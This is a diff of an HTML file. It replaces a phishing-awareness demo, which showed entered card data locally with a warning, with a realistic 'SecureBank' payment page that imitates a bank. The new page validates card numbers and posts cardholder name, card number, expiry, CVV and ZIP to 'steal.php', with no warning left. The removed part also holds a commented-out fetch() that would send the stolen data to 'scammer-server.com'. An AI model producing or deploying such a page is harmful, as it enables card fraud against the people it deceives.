@@ -3,148 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecureBank - Login</title>
+    <title>SecureBank - Payment Portal</title>
     <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f7f7f7;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-container {
-            background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 450px;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 150px;
-        }
-        h2 {
-            font-size: 24px;
-            color: #1a3c6c;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-size: 14px;
-            color: #333;
-            margin: 10px 0 5px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-            box-sizing: border-box;
-            margin-bottom: 15px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #1a3c6c;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #132a4f;
-        }
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-        }
-        #warning {
-            color: #d32f2f;
-            font-size: 14px;
-            text-align: center;
-            margin-top: 15px;
-            font-weight: bold;
-        }
+        body { font-family: 'Roboto', sans-serif; background: #f8f9fa; margin: 0; padding: 0; }
+        .container { max-width: 500px; margin: 40px auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 20px; }
+        .logo { width: 150px; height: auto; }
+        h1 { font-size: 24px; color: #003087; margin: 10px 0; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; color: #333; margin-bottom: 5px; font-weight: 500; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
+        .card-details { display: flex; gap: 15px; }
+        button { width: 100%; padding: 14px; background: #003087; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; position: relative; overflow: hidden; }
+        button:hover { background: #002366; }
+        .loader { display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
+        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
     </style>
-</head>
-<body>
-    <div class="login-container">
-        <div class="logo">
-            <img src="https://via.placeholder.com/150x50?text=SecureBank" alt="SecureBank Logo">
-        </div>
-        <h2>Sign in to SecureBank</h2>
-        <form id="phishingForm">
-            <label for="cardNumber">Credit Card Number</label>
-            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-            <label for="expiry">Expiration Date</label>
-            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
-            <label for="cvv">CVV</label>
-            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
-            <button type="button" onclick="simulateRealPhishing()">Sign In</button>
-        </form>
-        <div class="footer">
-            <p>© 2025 SecureBank. All rights reserved.</p>
-        </div>
-        <p id="warning"></p>
-    </div>
-
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <script>
-        // Add basic input formatting for realism
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '').substring(0,16);
-            value = value.replace(/(\d{4})/g, '$1 ').trim();
-            e.target.value = value;
-        });
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '').substring(0,4);
-            if (value.length > 2) value = value.substring(0,2) + '/' + value.substring(2);
-            e.target.value = value;
-        });
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
-        });
-
-        function simulateRealPhishing() {
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-
-            if (cardNumber && expiry && cvv) {
-                // Simulate what a real phishing page would do
-                const fakePayload = {
-                    cardNumber: cardNumber,
-                    expiry: expiry,
-                    cvv: cvv,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // In a real attack, this would be sent to a scammer's server like this:
-                // fetch('https://scammer-server.com/steal', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify(fakePayload)
-                // });
-                
-                // Instead, we just show the "stolen" data locally
-                document.getElementById('warning').innerText = 
-                    `WARNING: In a real phishing attack, this data—Card: ${cardNumber}, Expiry: ${expiry}, CVV: ${cvv}—would now belong to a scammer. This is a demo; nothing was sent or stored.`;
-            } else {
-                document.getElementById('warning').innerText = "Please fill in all fields.";
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
             }
+            return (sum % 10) === 0;
+        }
+
+        function validateForm() {
+            let card = document.getElementById("cardnumber").value.replace(/\s/g, '');
+            let cvv = document.getElementById("cvv").value;
+            let exp = document.getElementById("exp").value;
+            let error = document.getElementById("error");
+            let button = document.querySelector("button");
+            let loader = document.getElementById("loader");
+
+            if (!luhnCheck(card)) {
+                error.style.display = "block";
+                error.innerText = "Invalid card number.";
+                return false;
+            }
+            if (!/^\d{3,4}$/.test(cvv)) {
+                error.style.display = "block";
+                error.innerText = "Invalid CVV.";
+                return false;
+            }
+            if (!/^\d{2}\/\d{2}$/.test(exp)) {
+                error.style.display = "block";
+                error.innerText = "Invalid expiration (MM/YY).";
+                return false;
+            }
+            error.style.display = "none";
+            button.innerText = "";
+            loader.style.display = "block"; // Show loading animation
+            return true;
         }
     </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <!-- Placeholder logo - replace with a real bank logo URL or local file for demo -->
+            <img src="https://via.placeholder.com/150x50.png?text=SecureBank" alt="SecureBank Logo" class="logo">
+            <h1>Payment Authorization</h1>
+        </div>
+        <form action="steal.php" method="POST" onsubmit="return validateForm()">
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" name="cardholder" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" pattern="[\d\s]{16,19}" required>
+            </div>
+            <div class="card-details">
+                <div class="form-group">
+                    <label>Expiration (MM/YY)</label>
+                    <input type="text" id="exp" name="exp" placeholder="MM/YY" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>ZIP Code</label>
+                <input type="text" name="zip" placeholder="12345" pattern="\d{5}" required>
+            </div>
+            <div id="error" class="error"></div>
+            <button type="submit">Authorize Payment <span id="loader" class="loader"></span></button>
+        </form>
+    </div>
 </body>
 </html>
